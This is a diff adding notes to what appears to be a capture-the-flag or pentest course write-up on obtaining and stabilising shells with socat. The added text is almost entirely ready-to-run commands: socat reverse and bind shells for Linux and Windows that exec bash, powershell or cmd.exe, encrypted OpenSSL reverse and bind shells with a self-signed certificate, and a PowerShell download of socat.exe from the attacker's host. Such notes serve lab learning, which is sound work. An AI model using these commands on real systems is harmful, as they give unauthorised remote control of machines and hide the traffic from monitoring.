@@ -83,9 +83,68 @@ The third easy way to stabilise a shell is quite simply to use an initial netcat
 
 For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.
 
+### SOCAT 
 
+**REVERSE SHELL**  
+Listener
+```
+socat TCP-L:<port> - 
+# equivalent to nc -lvnp <port>
+```
 
- 
+On windows to connect back:
+```
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+```
+
+On Linux 
+```
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" 
+```
+
+**BIND SHELLS**
+On Linux Target:
+```
+socat TCP-L:<PORT> EXEC:"bash -li"
+```
+On Windows 
+```
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes 
+```
+
+on our attacking machine to connect to the waiting listener
+```
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
+
+### SOCAT ENCRYPTED SHELLS 
+
+```
+# generate certificate 
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+# Merge both file to single pem file 
+cat shell.key shell.crt > shell.pem
+
+# Start socat listner 
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+# verify=0 don't validate certificate if not properly signed by authority 
+# NOTE that the certificate must be used on whichever device is listening.
+
+# To CONNECT back
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash 
+```
+
+For Binding Shell
+```
+# TARGET 
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+# ATTACKER 
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+```
+
+The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:
+![socat](./media/10-socat.png)
 
 
 
